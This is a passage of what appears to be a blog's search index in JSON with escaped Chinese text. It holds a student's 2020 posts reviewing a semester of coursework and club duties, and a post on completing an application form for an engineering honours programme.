\u2714\u5de5\u4f5c\u7ec4\u4e3b\u9898\u63a8\u6587 \u2714\u5b66\u6587\u6d3b\u52a8\u63a8\u6587 \u2714\u5cf0\u4f1a\u5e72\u4e8b\u7ade\u9009 \u2714\u82f1\u8bed\u5f71\u8bc4 \u2714\u8fd0\u52a8\u4e0e\u8111\u4e2a\u4eba\u4f5c\u4e1a \u2714\u90e8\u95e8\u5723\u8bde\u5185\u5efa\u7b56\u5212 \u2714\u7ba1\u7406\u6c9f\u901a\u5c0f\u7ec4\u4f5c\u4e1a \u2714\u7ba1\u7406\u6c9f\u901a\u4e2a\u4eba\u4f5c\u4e1a \u2714\u63a8\u6587\u7ec4\u65e5\u5e38\u63a8\u6587 \u2714\u8fc7\u5e74\u4e91\u5cf0\u65b9\u9635\u6392\u7ec3 \u2714\u5fae\u79ef\u5206\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ebf\u4ee3\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ba1\u7406\u6c9f\u901a\u8bfe\u5802\u671f\u672b\u8003\u590d\u4e60 \u2714\u671f\u672b\u590d\u4e60\uff08\u5927\u82f1\u3001\u8fd0\u52a8\u4e0e\u8111\u3001\u5fae\u79ef\u5206\u3001C\u7a0b\u3001\u7ebf\u4ee3\u3001\u601d\u4fee\u3001\u7ecf\u6d4e\u6cd5\uff09 \u603b\u5f97\u6765\u8bf4\uff0c\u5356\u529b\u5212\u6868\uff0c\u539f\u5730\u6253\u8f6c\u3002\u4e0d\u8fc7\u4e5f\u5e76\u975e\u6beb\u65e0\u6536\u83b7\uff0c\u5927\u6982\u4e5f\u660e\u786e\u4e86\u4e8e\u81ea\u5df1\u800c\u8a00\uff0c\u54ea\u4e9b\u4e1c\u897f\u5177\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\u548c\u91cd\u8981\u6027\u3002\u6709\u559c\u6709\u5fe7\uff0c\u4e0d\u8fc7\u4eba\u4e4b\u5e38\u60c5\uff1b\u60a3\u5f97\u60a3\u5931\uff0c\u4e5f\u56e0\u5fc3\u4e2d\u6709\u7684\u3002","title":"\u8fc7\u53bb\u534a\u5e74\u7684\u56de\u987e"},{"location":"legacy/old_blog/20200309/#0202","text":"","title":"\u5c55\u671b0202\u8fd9\u4e00\u5e74"},{"location":"legacy/old_blog/20200309/#_4","text":"\u9996\u5148\uff0c\u5f53\u7136\u662f\u6700\u7d27\u8981\uff08\u8981\u547d\u7684\u5b66\u4e1a\u65b9\u9762\uff0c\u7531\u4e8e\u4e0a\u5b66\u671f\u56e0\u8fc7\u591a\u5b66\u5206\u5bfc\u81f4\u7cbe\u529b\u5206\u6563\u800c\u7f8e\u4e2d\u4e0d\u8db3\uff0c\u6240\u4ee5\u8fd9\u5b66\u671f\uff0c\u6211\u5728\u5b66\u5206\u65b9\u9762\u7ed9\u81ea\u5df1\u7559\u6709\u8f83\u5927\u7684\u8c03\u8282\uff08\u73a9\u800d\u7a7a\u95f4\uff0c\u4f46\u662f\u6c34\u8bfe\u53d8\u5c11\uff0c\u5176\u5b9e\u4e5f\u548c\u4e0a\u5b66\u671f\u534a\u65a4\u516b\u4e24\u3002\u603b\u4e4b\uff0c\u4e00\u4e2a\u65b9\u9488\u2014\u2014\u786c\u8bfe\u7a33\u4e00\u624b\uff0c\u6c34\u8bfe\u5077\u4e00\u628a\u3002\u7531\u4e8e\u53cc\u98de\u53f2\u7eb2\u548c\u9a6c\u539f\uff0c\u96be\u514d\u4f1a\u9677\u5165\u9e45\u9888\u7684\u6ce5\u6dd6\uff0c\u5f97\u6ce8\u610f\u7406\u667a\u51b7\u9759\u5730\u809d\u3002\u4fdd\u6301\u7a33\u5b9a\u5427\uff0c\u5176\u4ed6\u4e5f\u5c31\u8fd9\u6837\u3002 \u5bf9\u4e8e\u8f85\u4fee\u4e4b\u7c7b\uff0c\u9274\u4e8e\u8f85\u4fee\u7684\u6beb\u65e0\u5b58\u5728\u611f\uff0c\u51b3\u5b9a\u53bb\u8bd5\u8bd5\u5de5\u9ad8\u73ed\u3002\uff08\u8349\u7387\u5730\u77ac\u95f4\u505a\u51b3\u5b9a","title":"\u8bfe\u4e1a"},{"location":"legacy/old_blog/20200309/#_5","text":"\u7ec4\u7ec7\u65b9\u9762\uff0c\u5b66\u751f\u4f1a\u7684\u6d3b\u52a8\u7531\u4e8e\u67d0\u4e9b\u4e0d\u53ef\u63a7\u56e0\u7d20\uff08\u9886\u5bfc\u6e05\u5947\u7684\u8111\u56de\u8def\u548c\u538b\u69a8\u76f4\u63a5\u88ab\u53d6\u6d88\uff0c\u4f30\u6478\u7740\u63a5\u4e0b\u6765\u4e5f\u5c31\u662f\u4e00\u4e9b\u5c0f\u63a8\u6587\u5de5\u4f5c\u548c\u7559\u4efb\u5de5\u4f5c\uff0c\u521d\u6b65\u8ba1\u5212\u62d2\u7edd\u7559\u4efb\uff0c\u867d\u7136\u8bf4\u5f53\u4ec1\u4e0d\u8ba9\uff0c\u4f46\u662f\u4eba\u5404\u6709\u5fd7\u5427\u3002\u56e2\u5de5\u59d4\u65b9\u9762\uff0c\u5e94\u8be5\u8fd8\u6709\u4e00\u4e2a\u5ef6\u671f\u7684\u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae\u7684\u9879\u76ee\u548c\u65e5\u5e38\u503c\u73ed\uff0818r/h\u7684\u5ec9\u4ef7\u52b3\u52a8\u529b\uff0c\u4e5f\u4e0d\u7559\u4efb\u3002 \u793e\u56e2\u65b9\u9762\uff0c\u4fbf\u662f\u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2\uff0c\u4e0a\u4e2a\u5b66\u671f\u5f00\u5b66\u7684\u5934\u8111\u4e00\u70ed\u52a0\u5165\u7684orz\u3002\u4e0a\u5b66\u671f\u5185\u8bad\u7684Torch\u3001OpenCV\u65e9\u5df2\u88ab\u629b\u4e4b\u8111\u540e\uff0c\u8fc7\u4e8e\u6c34\u7684\u540e\u679c\u5c31\u662f\u8fd9\u5b66\u671f\u7684\u70b8\u88c2\u3002\u61a8\u61a8\u5982\u6211\uff0c\u9519\u8fc7\u4f8b\u4f1a\u88ab\u81ea\u52a8\u5206\u914d\u4efb\u52a1\uff0c\u7adf\u7136\u662f\u6211\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u6811\u8393\u6d3e/STM32\u3002\u6682\u4e14\u5148\u81ea\u5b66\u7740\u5427\uff0c\u53cd\u6b63\u662f\u793e\u56e2\uff0c\u5927\u4e0d\u4e86\u5495\u5495\u5495\uff08\u9003\u3002 \u5de5\u4f5c\u8ba1\u5212 \u4e91\u5cf0\u5b66\u751f\u4f1a \u7559\u4efb\u5de5\u4f5c \u65e5\u5e38\u63a8\u6587 \u56e2\u5de5\u59d4 \u65e5\u5e38\u503c\u73ed \u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae \u7559\u4efb \u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2 \u590d\u4e60\u5185\u8bad\u5185\u5bb9 Matplotlib Numpy Torch OpenCV \u5b8c\u6210\u6811\u8393\u6d3e/STM32\u63a8\u6587 \u505a\u5c0f\u7ec4\u9879\u76ee","title":"\u5de5\u4f5c"},{"location":"legacy/old_blog/20200309/#_6","text":"","title":"\u4e1a\u4f59"},{"location":"legacy/old_blog/20200309/#_7","text":"\u8fd9\u4e00\u7c7b\u4e8b\u60c5\u5c31\u662f\u90a3\u79cd\u8ba1\u5212\u548c\u5b8c\u6210\u6bd4\u5de8\u9ad8\u7684\uff0c\u6bcf\u6b21\u90fd\u4ee4\u81ea\u5df1\u61ca\u6094\u7684\u3002\u867d\u7136\u5982\u6b64\uff0c\u8ba1\u5212\u8fd8\u662f\u8981\u6709\u7684 TODO IMPORTANCE DS \u4e2d TOEFL \u9ad8 Blog \u4f4e Project \u4f4e Reading \u4e2d","title":"\u975e\u9893\u5e9f\u4e4b\u4e8b"},{"location":"legacy/old_blog/20200309/#_8","text":"\u867d\u7136\u662f\u4e00\u70b9\u7a7a\u865a\u7684\u5feb\u4e50\uff0c\u4f46\u662f\u4e5f\u662f\u4eba\u751f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5185\u5bb9\uff0c\u5728\u60c5\u611f\u4e0a\u5177\u6709\u66f4\u9ad8\u7684\u4ef7\u503c\u548c\u610f\u4e49\u5427\u3002 \u4f19\u4f34\u90ca\u6e38 \u534a\u591c\u72c2\u6b22 \u3002\u3002\u3002\uff08\u597d\u53ed\uff0c\u60f3\u4e0d\u51fa\u6765\u4e86\uff0c\u53cd\u6b63high\u5c31\u5bf9\u4e86\uff09","title":"\u5815\u843d\u5427"},{"location":"legacy/old_blog/20200309/#_9","text":"\u788e\u788e\u5ff5\u4e86\u8fd9\u4e48\u4e45\uff0c\u4e5f\u4e0d\u77e5\u4e91\u4e91 \u4e3b\u8981\u662f\u642d\u5efa\u4e86\u4e00\u4e2aBlog\uff0c\u603b\u4e0d\u80fd\u8ba9\u5b83\u7a7a\u7a7a\u5982\u4e5f\uff0c\u6240\u4ee5\u5c31\u4e92\u62fc\u4e71\u51d1\u5730\u5148\u5199\u4e00\u7bc7\u6491\u6491\u573a\u9762\uff0c\u8fd8\u5f97Blog\u8981\u7d20\u5168\u4e86\u3002\u54c8\u54c8\u54c8\uff01 \u7adf\u7136\u5199\u4e86\u90a3\u4e48\u4e45\uff0c\u4e3b\u8981\u4e2d\u95f4\u5404\u79cd\u4e8b\u60c5\u5c42\u51fa\u4e0d\u7a77\uff0c\u5207\u8bb0\uff0c\u4e00\u5fc3\u4e0d\u53ef\u591a\u7528\u554a\uff01 2020.3.9 21:45","title":"\u5199\u5728\u6587\u672b"},{"location":"legacy/old_blog/20200318/","text":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 \u00b6 \u7ea6 1475 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f Abstract \u672c\u6587\u5199\u4e8e2020\u5e743\u670818\u65e5\uff0c\u73b0\u4f5c\u6574\u7406\u6536\u5f55\u3002 \u5de5\u9ad8\u73ed \uff0c\u5168\u540d\u5de5\u7a0b\u6559\u80b2\u7ba1\u7406\u9ad8\u7ea7\u73ed\uff08ACEE\uff09\uff0c\u662f\u7afa\u53ef\u6862\u5b66\u9662\u5f00\u8bbe\u7684\u4e00\u4e2a\u8f85\u4fee\u73ed\uff0c\u6709\u8fc7\u9ad8\u7ee9\u70b9\u73ed\u7b49\u5916\u53f7\uff0c\u5f53\u7136\u4e5f\u6709\u8fc7int ia ic ie\u7684\u4e11\u95fb(\u6ed1\u7a3d \uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\u3002 \u8003\u8651\u5230\u6709\u4eba\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u5de5\u9ad8\u73ed\uff0c\u6240\u4ee5\u5728\u5f00\u5934\u89e3\u91ca\u4e00\u4e0b\u3002 \u8d77\u6e90 \u00b6 \u7531\u4e8e\u6211\u4e0a\u4e00\u5468\u7684\u4e34\u65f6\u8d77\u610f\uff0c\u6240\u4ee5\u8d76\u9e2d\u5b50\u4e0a\u67b6\u5730\u53c2\u52a0\u4e86\u5de5\u9ad8\u73ed\u7684\u62a5\u540d\u3002\u4e8e\u662f\u5728\u4e0a\u5468\u4e09\uff0c\u6211\u5174\u51b2\u51b2\u5730\u53bb\u4e0b\u8f7d\u4e86\u62a5\u540d\u8868\u4ece\u6b64\u8d70\u4e0a\u4e86\u4e00\u6761\u4e0d\u5f52\u8def\u3002\u8fd9\u662f\u4e00\u4efd\u5bb9\u91cf\u6781\u5927\u7684\u62a5\u540d\u8868\uff0c\u6211\u6574\u6574\u82b1\u4e86\u534a\u4e2a\u5c0f\u65f6\u9605\u8bfb\u6574\u4e00\u4efd\u62a5\u540d\u8868\uff0c\u5176\u4e2d\u5927\u6982\u6db5\u76d6\u4e86\u827a\u672f\u5ba1\u7f8e\u3001\u6570\u7406\u57fa\u7840\u3001\u7f16\u7a0b\u601d\u7ef4\u7b49\u4e00\u7cfb\u5217\u5185\u5bb9\u3002\u867d\u7136\u8bf4\uff0c\u96be\u5ea6\u4e0d\u662f\u9ad8\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u4f46\u662f\u5168\u65b0\u7684\u5185\u5bb9\u8fd8\u662f\u9700\u8981\u5f88\u9ad8\u7684\u5b66\u4e60\u65f6\u95f4\u6210\u672c\uff0c\u6240\u4ee5\u4e00\u5468\u7684\u65f6\u95f4\u4e5f\u662f\u5341\u5206\u5403\u7d27\u7684\uff0c\u6bd5\u7adf\u8fd8\u6709\u65e5\u5e38\u7684\u5b66\u4e1a\u5212\u6c34\u4efb\u52a1\u3002 \u81ea\u5df1\u9009\u62e9\u7684\u8def\uff0c\u722a\u5df4\u4e5f\u8981\u8d70\u5b8c\u3002 \u8fd9\u4e00\u4e2a\u793c\u62dc\u4ee5\u6765\uff0c\u6211\u7684\u65e5\u5e38\u751f\u6d3b\u5c31\u9677\u4e8e\u8d77\u5e8a\u2014\u2014\u505a\u8868\u2014\u2014\u4e0a\u8bfe\u2014\u2014\u4e0b\u8bfe\u2014\u2014\u505a\u8868\u2014\u2014\u8fdb\u98df\u2014\u2014\u505a\u8868\u2014\u2014\u7761\u89c9\u2014\u2014\u8d77\u5e8a\u7684\u65e0\u9650\u5faa\u73af\u4e4b\u4e2d\uff0c\u50cf\u662f\u4e00\u4e2a\u6ca1\u6709\u611f\u60c5\u7684\u673a\u5668\uff08\u4e3b\u8981\u8fd8\u662f\u6211\u592a\u83dc\u4e86\u3002\u4e0d\u7ba1\u7ed3\u679c\u5982\u4f55\uff0c\u6bd5\u7adf\u6211\u7ec8\u4e8e\u5b8c\u6210\u80e1\u7f16\u4e71\u9020\u4e86\u62a5\u540d\u8868\u5e76\u4e14\u63d0\u4ea4\u4e86\uff0c\u6240\u4ee5\u6211\u8fd8\u662f\u60f3\u8be6\u7ec6\u5730\u6765\u8bf4\u8bf4\u505a\u9898\u65f6\u7684\u5177\u4f53\u611f\u53d7\u3002 \u5bf9\u4e8e\u9898\u76ee\u5177\u4f53\u5206\u6790\u548c\u76f8\u5173\u77e5\u8bc6\uff0c\u6211\u60f3\u6211\u5927\u6982\u4e5f\u8bb8\u53ef\u80fd\u4f1a\u5199\u4e00\u4e2a\u7cfb\u5217\u8be6\u7ec6\u4ecb\u7ecd\u5427\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u8bf4\u8bf4\u611f\u53d7\uff0c\u77e5\u8bc6\u6027\u53ef\u80fd\u4e0d\u4e00\u5b9a\u5f88\u5f3a\u3002 \u521d\u5165\u70bc\u72f1 \u00b6 \u6d4f\u89c8\u4e86\u4e00\u904d\u62a5\u540d\u8868\u540e\uff0c\u6211\u5927\u6982\u5c06\u62a5\u540d\u8868\u5206\u6210\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u3002 \u9898\u76ee\u5217\u8868 Module 1 Task 1\uff1aStory Board Task 2\uff1aAffective Diary Module 2 Section 1\uff1aMatlab Tilted Photos Image Processing Section 2 SolidWorks Multisim Python Assembly Section 3 Math in Epidemic Lagrangian Function in Physics Chemistry and Engineering \u5177\u4f53\u7684\u8981\u6c42\u662f\u5728Module 1\u4e2d\u9009\u62e9\u4e00\u4e2aTask\u5b8c\u6210\uff0c\u540c\u65f6\u8981\u6c42\u5b8c\u6210Module 2\u4e2d\u6bcf\u4e2aSection\u4e2d\u7684\u4e00\u9053\u9898\uff0c\u6240\u4ee5\u603b\u5171\u9700\u8981\u5b8c\u6210\u56db\u9053\u9898\uff0c\u63a5\u4e0b\u6765\u6211\u5c06\u4ee5\u6211\u7684\u7b54\u9898\u987a\u5e8f\u6765\u8bb2\u8bb2\u6211\u505a\u9898\u4e2d\u7684\u611f\u53d7\u548c\u60f3\u6cd5\u3002 \u7f13\u6162\u524d\u8fdb \u00b6 Python \u00b6 \u6211\u4e4b\u6240\u4ee5\u9009\u62e9Python\u5165\u624b\uff0c\u539f\u56e0\u662f\u5728\u90a3\u4e48\u591a\u9898\u4e2d\u6211\u76f8\u5bf9\u6bd4\u8f83\u719f\u6089\u3002\u800c\u4e14\u4ece\u8fd9\u6b21\u9898\u76ee\u4e2d\u6765\u770b\uff0c\u8fd9\u662f\u4e00\u9053\u76f8\u5bf9\u6bd4\u8f83\u7b80\u5355\u7684\u9898\uff0c\u53ea\u8981\u6c42\u4f60\u901a\u8fc7Pygame\u6765\u5b9e\u73b0\u4e00\u4e2a\u5b83\u6240\u8981\u6c42\u7684\u5c0f\u6e38\u620f\u5373\u53ef\u3002\u5c31\u6211\u4e2a\u4eba\u611f\u53d7\u800c\u8a00\uff0c\u6574\u4f53\u96be\u5ea6\u4e0d\u5927\uff0c\u7b97\u6cd5\u8981\u6c42\u4e0d\u9ad8\uff0c\u4e00\u822c\u6765\u8bf4\u51e0\u4e2a\u5c0f\u65f6\u5c31\u80fd\u5b8c\u6210\uff0c\u6240\u4ee5\u6211\u4e5f\u4e0d\u518d\u8d58\u8ff0\uff0c\u7b49\u4ee5\u540e\u7cfb\u5217\u535a\u6587\u91cc\u518d\u63d0\u5427\u3002\u53e6\u5916\uff0c\u628a\u5b83\u653e\u5728\u6700\u5148\u505a\uff0c\u8fd8\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a8\u52a8\u6211\u53bb\u505a\u8868\uff0c\u4e00\u662f\u56e0\u4e3a\u589e\u5f3a\u4e86\u4fe1\u5fc3\uff0c\u4e8c\u662f\u6709\u4e86\u96be\u4ee5\u653e\u5f03\u7684\u6c89\u6ca1\u6210\u672c\uff0c\u563f\u563f\u3002 Matlab\uff1aTilted Photos \u00b6 \u8fd9\u9053\u9898\uff0c\u771f\u7684\u662f\u628a\u6211\u521a\u521a\u4ecePython\u5efa\u7acb\u8d77\u7684\u4fe1\u5fc3\u5f7b\u5f7b\u5e95\u5e95\u7684\u6253\u57ae\u4e86\u3002\u867d\u7136\u8bf4\u4e0a\u5b66\u671f\u6211\u65e9\u5c31\u628aMatlab\u5b89\u88c5\u4e86\uff0c\u4f46\u9876\u591a\u7528\u6765\u89e3\u89e3\u6570\u5b66\u9898\u4e4b\u7c7b\uff0c\u81f3\u4e8e\u5176\u4ed6\uff0c\u751a\u81f3\u5b83\u672c\u8eab\u7684\u8bed\u6cd5\u90fd\u4e0d\u592a\u4e86\u89e3\uff0c\u4f46\u4e5f\u53ea\u80fd\u786c\u7740\u5934\u76ae\u4e0a\u3002\u66f4\u52a0\u8ba9\u4eba\u5954\u6e83\u7684\u662f\uff0c\u5b83\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528Matlab\u672c\u8eab\u63d0\u4f9b\u7684\u51fd\u6570\u6216\u8005Toolbox\u6765\u89e3\u51b3\u5173\u952e\u6b65\u9aa4\uff0c\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u5173\u952e\u7b97\u6cd5\u8981\u81ea\u5df1\u53bb\u60f3\u3002\u6700\u540e\uff0c\u6211\u82b1\u4e86\u8fd1\u4e24\u5929\u65f6\u95f4\u5b66\u4e60\u4e86Matlab\u4ee5\u53ca\u6709\u5173\u56fe\u50cf\u5904\u7406\u8bc6\u522b\u7684\u4e00\u90e8\u5206\u77e5\u8bc6\uff0c\u624d\u52c9\u52c9\u5f3a\u5f3a\u5730\u5b8c\u6210\u4e86\u5b83\u4e00\u90e8\u5206\u7684\u8981\u6c42\u3002 \u6700\u540e\u5173\u4e8e\u795e\u7ecf\u7f51\u7edc\u90e8\u5206\uff0c\u7531\u4e8e\u65f6\u95f4\u539f\u56e0\uff0c\u6211\u662f\u6ca1\u6709\u5b8c\u6210\u7684\uff0c\u4e0d\u8fc7\u540e\u7eed\u6211\u4f1a\u8ddf\u8fdb\u5b66\u4e60\uff0c\u5e94\u8be5\u4f1a\u53d1\u5b66\u4e60\u535a\u6587\u7684\u5427\u3002\u603b\u4f53\u6765\u8bf4\uff0c\u6211\u5bf9\u81ea\u5df1\u8fd8\u662f\u6bd4\u8f83\u6ee1\u610f\u7684\uff0c\u6bd5\u7adf\u6211\u4e0d\u662f\u5927\u4f6c\uff0c\u53ea\u662f\u4e00\u4e2a\u5c0f\u83dc\u9e21\uff0c\u54b8\u9c7c\u53ef\u662f\u5f88\u5bb9\u6613\u81ea\u6211\u6ee1\u8db3\u7684~\uff0845\u5ea6\u4ef0\u671b\u5927\u4f6corz Lagrangian Function in Physics \u00b6 \u4ece\u5185\u5bb9\u4e0a\u6765\u770b\u5e94\u8be5\u662f\u4e00\u9053\u7406\u8bba\u7269\u7406\u9898\uff0c\u6beb\u65e0\u57fa\u7840\u7684\u6211\u5bf9\u7740\u76f8\u5173\u77e5\u8bc6\u8fdb\u884c\u4e00\u6ce2\u56eb\u56f5\u541e\u67a3\uff0c\u52c9\u5f3a\u4f5c\u51fa\u4e86\u4e00\u90e8\u9898\u76ee\uff0c\u4e0d\u8fc7\u540e\u9762\u9047\u5230\u4e86\u65e0\u6cd5\u63a5\u7684\u591a\u5143\u5fae\u5206\u65b9\u7a0b\u7ec4\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u5c31\u96be\u4ee5\u8fdb\u884c\u4e0b\u53bb\u3002\u6211\u4e2a\u4eba\u5176\u5b9e\u5bf9\u8fd9\u9053\u9898\u633a\u9057\u61be\u7684\uff0c\u6bd5\u7adf\u611f\u89c9\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u7b97\u4e86\uff0c\u90fd\u8fc7\u53bb\u4e86\u3002\u672c\u6765\u5c31\u662f\u4e34\u65f6\u5b66\u7684\uff0c\u57fa\u7840\u5565\u4e5f\u6ca1\u6709\uff0c\u5c31\u8fd9\u6837\u5427\u3002 Affective Diary \u00b6 \u8fd9\u4e00\u90e8\u5206\u5c31\u6bd4\u8f83\u7b80\u7b54\u4e86\uff0c\u7531\u4e8e\u8003\u5bdf\u7684\u662f\u827a\u672f\u5ba1\u7f8e\u548c\u4eba\u6587\u7d20\u517b\uff0c\u6240\u4ee5\u5927\u6982\u5c31\u662f\u5f88\u7384\u5b66\u5427\u3002\u5148\u8981\u6c42\u53bb\u8bfb\u4e00\u7bc7\u82f1\u6587\u8bba\u6587\uff08\u597d\u50cf\u662f\u5fae\u8f6f\u7814\u7a76\u9662\u7684\uff0c\u4e0d\u8fc7\u4e2a\u4eba\u611f\u89c9\u6ca1\u5565\u5e2e\u52a9\u3002\u4e4b\u540e\u4fbf\u662f\u8981\u6c42\u5236\u4f5c\u4e00\u4efd\u5c5e\u4e8e\u81ea\u5df1\u7684Affective Diary\uff0c\u624b\u7ed8\u3001\u7535\u8111\u5236\u56fe\u90fd\u884c\u3002\u6211\u9009\u62e9\u4e86\u7528Ps\uff0c\u6700\u6df1\u7684\u611f\u53d7\u5c31\u662f\uff0c\u6211\u5bf9\u7f8e\u672f\u5b8c\u4e86\uff01\uff01\uff01\u505a\u5230\u8fd9\u91cc\u6211\u5df2\u7ecf\u4f5b\u7cfb\u4e86\uff0c\u4e00\u5207\u968f\u7f18\u7684\u6211\u5df2\u7ecf\u628a\u505a\u5b8c\u8868\u5f53\u4f5c\u76ee\u6807\u4e86\u3002\u8d28\u91cf\u4ec0\u4e48\u7684\u90fd\u4e00\u8fb9\u53bb\uff01 \u540e\u8bb0 \u00b6 \u867d\u7136\u8bf4\u622a\u6b62\u65f6\u95f4\u662f\u4eca\u5929\u65e9\u4e0a11:00\uff0c\u4e0d\u8fc7\u6211\u8fd8\u662f\u5728\u6628\u5929\u665a\u4e0a\u5c31\u7126\u8651\uff0c\u6bd5\u7adf\u65e9\u4ea4\u65e9\u8d85\u751f\uff0c\u5b9e\u9645\u4e0a\u662f\u56e0\u4e3a\u6211\u505a\u4e0d\u51fa\u6765\u4e86\u3002\u540e\u9762\u8fd8\u6709\u4e09\u8f6e\u7684\u8003\u6838\uff0c\u5982\u679c\u6211\u80fd\u82df\u8fdb\u540e\u9762\u51e0\u8f6e\u8003\u6838\uff0c\u6211\u4e5f\u4f1a\u5199\u76f8\u5173\u5185\u5bb9\u7684\uff08\u5c3d\u91cf\u3002 \u4e0d\u8fc7\u6709\u4e00\u8bf4\u4e00\uff0c\u6211\u8fd8\u662f\u5e0c\u671b\u7b2c\u4e00\u8f6e \u88ab\u5237\u4e5f\u4e0d\u8981\u6700\u540e\u4e00\u8f6e\u88ab\u5237\u3002 \u8fd8\u6709\uff0c\u6211\u53d1\u73b0\u8fd9\u6b21\u53ef\u80fd\u7531\u4e8e\u75ab\u60c5\u5728\u5bb6\u7684\u539f\u56e0\uff0c\u7adf\u7136\u53ea\u670987\u4eba\u53c2\u4e0e\u4e86\u62a5\u540d\uff0c\u5f55\u53d6\u7387\u9ad8\u8fbe46%\uff01\u4f46\u662f\u6211\u77e5\u9053\uff0c\u8fd9\u8fd8\u662f\u5927\u4f6c\u7684\u6218\u4e89\uff0c\u5927\u4f6c\u7684\u5e73\u5747\u6c34\u5e73\u2026\u2026. \u5bb3\uff0c\u4e0d\u8bf4\u4e86\uff0c\u6211\u8981\u597d\u597d\u4f11\u606f\u8c03\u6574\u4e00\u4e0b\u4e86zzzzzzzzzz","title":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3"},{"location":"legacy/old_blog/20200318/#_1","text":"\u7ea6 1475 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f Abstract \u672c\u6587\u5199\u4e8e2020\u5e743\u670818\u65e5\uff0c\u73b0\u4f5c\u6574\u7406\u6536\u5f55\u3002 \u5de5\u9ad8\u73ed \uff0c\u5168\u540d\u5de5\u7a0b\u6559\u80b2\u7ba1\u7406\u9ad8\u7ea7\u73ed\uff08ACEE\uff09\uff0c\u662f\u7afa\u53ef\u6862\u5b66\u9662\u5f00\u8bbe\u7684\u4e00\u4e2a\u8f85\u4fee\u73ed\uff0c\u6709\u8fc7\u9ad8\u7ee9\u70b9\u73ed\u7b49\u5916\u53f7\uff0c\u5f53\u7136\u4e5f\u6709\u8fc7int ia ic ie\u7684\u4e11\u95fb(\u6ed1\u7a3d \uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\u3002 \u8003\u8651\u5230\u6709\u4eba\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u5de5\u9ad8\u73ed\uff0c\u6240\u4ee5\u5728\u5f00\u5934\u89e3\u91ca\u4e00\u4e0b\u3002","title":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3"},{"location":"legacy/old_blog/20200318/#_2","text":"\u7531\u4e8e\u6211\u4e0a\u4e00\u5468\u7684\u4e34\u65f6\u8d77\u610f\uff0c\u6240\u4ee5\u8d76\u9e2d\u5b50\u4e0a\u67b6\u5730\u53c2\u52a0\u4e86\u5de5\u9ad8\u73ed\u7684\u62a5\u540d\u3002\u4e8e\u662f\u5728\u4e0a\u5468\u4e09\uff0c\u6211\u5174\u51b2\u51b2\u5730\u53bb\u4e0b\u8f7d\u4e86\u62a5\u540d\u8868\u4ece\u6b64\u8d70\u4e0a\u4e86\u4e00\u6761\u4e0d\u5f52\u8def\u3002\u8fd9\u662f\u4e00\u4efd\u5bb9\u91cf\u6781\u5927\u7684\u62a5\u540d\u8868\uff0c\u6211\u6574\u6574\u82b1\u4e86\u534a\u4e2a\u5c0f\u65f6\u9605\u8bfb\u6574\u4e00\u4efd\u62a5\u540d\u8868\uff0c\u5176\u4e2d\u5927\u6982\u6db5\u76d6\u4e86\u827a\u672f\u5ba1\u7f8e\u3001\u6570\u7406\u57fa\u7840\u3001\u7f16\u7a0b\u601d\u7ef4\u7b49\u4e00\u7cfb\u5217\u5185\u5bb9\u3002\u867d\u7136\u8bf4\uff0c\u96be\u5ea6\u4e0d\u662f\u9ad8\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u4f46\u662f\u5168\u65b0\u7684\u5185\u5bb9\u8fd8\u662f\u9700\u8981\u5f88\u9ad8\u7684\u5b66\u4e60\u65f6\u95f4\u6210\u672c\uff0c\u6240\u4ee5\u4e00\u5468\u7684\u65f6\u95f4\u4e5f\u662f\u5341\u5206\u5403\u7d27\u7684\uff0c\u6bd5\u7adf\u8fd8\u6709\u65e5\u5e38\u7684\u5b66\u4e1a\u5212\u6c34\u4efb\u52a1\u3002 \u81ea\u5df1\u9009\u62e9\u7684\u8def\uff0c\u722a\u5df4\u4e5f\u8981\u8d70\u5b8c\u3002 \u8fd9\u4e00\u4e2a\u793c\u62dc\u4ee5\u6765\uff0c\u6211\u7684\u65e5\u5e38\u751f\u6d3b\u5c31\u9677\u4e8e\u8d77\u5e8a\u2014\u2014\u505a\u8868\u2014\u2014\u4e0a\u8bfe\u2014\u2014\u4e0b\u8bfe\u2014\u2014\u505a\u8868\u2014\u2014\u8fdb\u98df\u2014\u2014\u505a\u8868\u2014\u2014\u7761\u89c9\u2014\u2014\u8d77\u5e8a\u7684\u65e0\u9650\u5faa\u73af\u4e4b\u4e2d\uff0c\u50cf\u662f\u4e00\u4e2a\u6ca1\u6709\u611f\u60c5\u7684\u673a\u5668\uff08\u4e3b\u8981\u8fd8\u662f\u6211\u592a\u83dc\u4e86\u3002\u4e0d\u7ba1\u7ed3\u679c\u5982\u4f55\uff0c\u6bd5\u7adf\u6211\u7ec8\u4e8e\u5b8c\u6210\u80e1\u7f16\u4e71\u9020\u4e86\u62a5\u540d\u8868\u5e76\u4e14\u63d0\u4ea4\u4e86\uff0c\u6240\u4ee5\u6211\u8fd8\u662f\u60f3\u8be6\u7ec6\u5730\u6765\u8bf4\u8bf4\u5